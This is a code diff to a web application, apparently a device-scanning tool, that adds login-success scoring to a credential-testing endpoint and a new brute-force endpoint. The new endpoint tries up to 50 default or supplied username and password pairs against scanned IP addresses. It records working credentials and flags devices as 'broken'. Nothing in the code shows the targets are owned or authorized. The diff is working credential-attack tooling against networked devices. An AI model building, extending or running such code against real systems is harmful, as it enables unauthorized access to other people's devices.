@@ -259,6 +259,12 @@ def api_broken_items(user, result_id):
 @require_auth
 def api_test_device(user, item_id):
     import requests as http_req
+    from GetYourDevice import (
+        extract_title, extract_form_fields, response_has_session_cookie,
+        has_dashboard_content, has_login_form, count_failure_phrases,
+        body_has_password_input, has_error_banner, body_has_success_phrases
+    )
+    from difflib import SequenceMatcher
     try:
         resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
         if not resp.data:
@@ -276,32 +282,213 @@ def api_test_device(user, item_id):
 
     result = {"status": "error", "message": ""}
     try:
+        # First get unauth body for comparison
+        unauth_body = ""
+        unauth_title = ""
+        unauth_forms = None
+        try:
+            u = http_req.get(f"{scheme}://{ip}:{port}", timeout=5, allow_redirects=False, verify=False)
+            unauth_body = u.text or ""
+            unauth_title = extract_title(unauth_body)
+            unauth_forms = extract_form_fields(unauth_body)
+        except:
+            pass
+
         r = http_req.get(f"{scheme}://{ip}:{port}", auth=(username, password),
                          timeout=10, allow_redirects=False, verify=False)
         result["status_code"] = r.status_code
         result["headers"] = dict(r.headers)
         result["body_preview"] = r.text[:2000]
-        if r.status_code in (200, 301, 302):
-            body_lower = (r.text or "").lower()[:5000]
-            login_kw = ["login", "password", "sign in", "username", "type=\"password\"", "authenticate"]
-            has_login = any(x in body_lower for x in login_kw)
-            fail_kw = ["invalid", "incorrect", "wrong", "failed", "denied", "unauthorized"]
-            has_fail = any(x in body_lower for x in fail_kw)
-            dash_kw = ["dashboard", "welcome", "logout", "administration", "overview", "settings"]
-            has_dash = any(x in body_lower for x in dash_kw)
-            if has_login and not has_dash:
-                result["message"] = "Still on login page (credentials rejected or form-based auth)"
-            elif has_fail:
-                result["message"] = f"Login failure detected ({' '.join(x for x in fail_kw if x in body_lower)})"
+
+        if r.status_code == 401:
+            result["message"] = "HTTP 401 Unauthorized"
+        elif r.status_code in (302, 301):
+            dest = r.headers.get("Location", "").lower()
+            login_paths = ("login", "auth", "signin", "logon", "authenticate")
+            if any(x in dest for x in login_paths):
+                result["message"] = f"Redirected to {dest} (login page)"
             else:
                 result["status"] = "ok"
-                result["message"] = "Credentials work"
+                result["message"] = f"Redirect to {dest} — credentials accepted"
                 supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
+        elif r.status_code == 200:
+            body = r.text or ""
+            body_lower = body.lower()[:5000]
+
+            # Scoring system
+            score = 0
+            reasons = []
+
+            # Session cookie
+            if response_has_session_cookie(r):
+                score += 40
+                reasons.append("session_cookie")
+
+            # Dashboard content
+            dc = has_dashboard_content(body_lower)
+            if dc:
+                score += 25
+                reasons.append("dashboard_content")
+
+            # Title change
+            cur_title = extract_title(body)
+            if cur_title and unauth_title:
+                t1, t2 = cur_title.lower(), unauth_title.lower()
+                if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
+                    score += 20
+                    reasons.append("title_changed")
+
+            # Form structure
+            auth_forms = extract_form_fields(body)
+            if unauth_forms and auth_forms:
+                if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
+                    score += 30
+                    reasons.append("no_more_password_field")
+
+            # Success phrases
+            sp = body_has_success_phrases(body)
+            score += sp * 6
+            if sp > 0:
+                reasons.append("success_phrases")
+
+            # Password field still present
+            if body_has_password_input(body):
+                score -= 40
+                reasons.append("still_has_password")
+
+            # Body similarity
+            if unauth_body and len(body) > 200 and len(unauth_body) > 200:
+                ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
+                if ratio > 0.93:
+                    score -= 50
+                    reasons.append(f"body_similarity_{ratio:.2f}")
+                elif ratio > 0.80:
+                    score -= 20
+
+            # Login form without dashboard
+            if has_login_form(body_lower) and not dc:
+                score -= 30
+                reasons.append("login_form_no_dash")
+
+            # Failure phrases
+            fc = count_failure_phrases(body)
+            score -= fc * 8
+            if fc > 0:
+                reasons.append(f"failure_phrases_{fc}")
+
+            # Error banners
+            if has_error_banner(body_lower):
+                score -= 20
+                reasons.append("error_banner")
+
+            result["score"] = score
+            result["reasons"] = reasons
+
+            if score >= 25:
+                result["status"] = "ok"
+                result["message"] = f"Auth works (score={score})"
+                supabase.table("scan_result_items").update({"broken": True, "broken_at": datetime.now(timezone.utc).isoformat()}).eq("id", item_uuid).execute()
+            elif score >= 0:
+                result["message"] = f"Uncertain (score={score}): {', '.join(reasons)}"
+            else:
+                result["message"] = f"Auth rejected (score={score}): {', '.join(reasons)}"
         else:
             result["message"] = f"HTTP {r.status_code}"
     except Exception as e:
         result["message"] = str(e)[:200]
     return jsonify(result)
+
+
+@app.route("/api/devices/<item_id>/brute", methods=["POST"])
+@require_auth
+def api_brute_device(user, item_id):
+    import requests as http_req
+    from GetYourDevice import (
+        get_relevant_creds, extract_title, extract_form_fields,
+        response_has_session_cookie, has_dashboard_content, has_login_form,
+        count_failure_phrases, body_has_password_input, has_error_banner,
+        body_has_success_phrases, _auth_attempt_counts, _auth_attempt_lock,
+        MAX_AUTH_PER_IP
+    )
+    from difflib import SequenceMatcher
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
+        if not resp.data:
+            return jsonify({"error": "not found"}), 404
+        item = resp.data[0]
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+    ip = item.get("ip", "")
+    port = item.get("port", 80)
+    device = item.get("device", "")
+    scheme = "https" if port in (443, 8443, 9443) else "http"
+
+    body_data = request.get_json(force=True) or {}
+    custom_creds = body_data.get("creds", [])
+    max_tries = int(body_data.get("max_tries", 50))
+
+    # Get unauth baseline
+    unauth_body = ""
+    unauth_title = ""
+    unauth_forms = None
+    try:
+        u = http_req.get(f"{scheme}://{ip}:{port}", timeout=5, allow_redirects=False, verify=False)
+        unauth_body = u.text or ""
+        unauth_title = extract_title(unauth_body)
+        unauth_forms = extract_form_fields(unauth_body)
+    except:
+        pass
+
+    if custom_creds:
+        creds_to_try = custom_creds[:max_tries]
+    else:
+        creds_to_try = [(u, p, n) for u, p, n in get_relevant_creds(device, max_creds=max_tries)]
+
+    working = []
+    for user, pw, note in creds_to_try:
+        if len(working) >= 5:
+            break
+        try:
+            r = http_req.get(f"{scheme}://{ip}:{port}", auth=(user, pw),
+                             timeout=5, allow_redirects=False, verify=False)
+            if r.status_code == 401:
+                continue
+            if r.status_code in (302, 301):
+                dest = r.headers.get("Location", "").lower()
+                if not any(x in dest for x in ("login", "auth", "signin")):
+                    working.append({"username": user, "password": pw, "note": note, "status": r.status_code, "score": 100})
+                continue
+            if r.status_code == 200:
+                body = r.text or ""
+                body_lower = body.lower()[:5000]
+                score = 0
+                if response_has_session_cookie(r): score += 40
+                if has_dashboard_content(body_lower): score += 25
+                cur_title = extract_title(body)
+                if cur_title and unauth_title:
+                    t1, t2 = cur_title.lower(), unauth_title.lower()
+                    if t1 != t2 and not any(x in t1 for x in ("login", "sign in", "signin", "authenticate", "password")):
+                        score += 20
+                auth_forms = extract_form_fields(body)
+                if unauth_forms and auth_forms:
+                    if unauth_forms["password_count"] > 0 and auth_forms["password_count"] == 0:
+                        score += 30
+                score += body_has_success_phrases(body) * 6
+                if body_has_password_input(body): score -= 40
+                if unauth_body and len(body) > 200 and len(unauth_body) > 200:
+                    ratio = SequenceMatcher(None, body[:3000], unauth_body[:3000]).ratio()
+                    if ratio > 0.93: score -= 50
+                    elif ratio > 0.80: score -= 20
+                if has_login_form(body_lower): score -= 30
+                score -= count_failure_phrases(body) * 8
+                if has_error_banner(body_lower): score -= 20
+                if score >= 25:
+                    working.append({"username": user, "password": pw, "note": note, "status": r.status_code, "score": score})
+        except:
+            pass
+
+    return jsonify({"status": "ok", "total_tried": len(creds_to_try), "working": working})
 
 @app.route("/api/devices/<item_id>/access", methods=["POST"])
 @require_auth
